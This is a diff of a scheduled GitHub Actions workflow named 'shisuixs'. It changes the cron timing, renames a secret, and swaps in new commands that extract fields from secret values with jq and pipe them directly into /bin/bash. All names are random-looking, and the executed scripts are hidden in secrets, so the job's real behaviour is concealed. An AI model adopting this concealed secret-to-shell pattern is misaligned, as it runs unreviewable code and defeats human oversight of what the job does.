@@ -3,7 +3,8 @@ name: shisuixs
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 3/6 * * *'
+    - cron: '57 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,15 +12,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: shisuixs
         env:
-          tb7058: ${{ secrets.tb7058 }}
+          tnivs029: ${{ secrets.tnivs029 }}
         run: |
-          echo $tb7058 | jq -r .rljb1208 | /bin/bash
-          echo $txk40 | jq -r .up4187 | /bin/bash
-          echo $n25 | jq -r .ug519 | /bin/bash
-          echo $vccr36343 | jq -r .e13 | /bin/bash
-          echo $w80998 | jq -r .kn9 | /bin/bash
-          echo $igqbe86972 | jq -r .j51711 | /bin/bash
-          echo $vo334 | jq -r .p846 | /bin/bash
-          echo $cobuj852 | jq -r .inylf982 | /bin/bash
-          echo $br08 | jq -r .bj2393 | /bin/bash
+          echo $tnivs029 | jq -r .hh48785 | /bin/bash
+          echo $yql5366 | jq -r .t8 | /bin/bash
+          echo $au62 | jq -r .ekj584 | /bin/bash
+          echo $vd70710 | jq -r .lnwkr3 | /bin/bash
+          echo $p3 | jq -r .w13007 | /bin/bash
+          echo $jxx5186 | jq -r .f0635 | /bin/bash
+          echo $gkdp801 | jq -r .vyolk5 | /bin/bash
+          echo $b29072 | jq -r .ejywm113 | /bin/bash
 
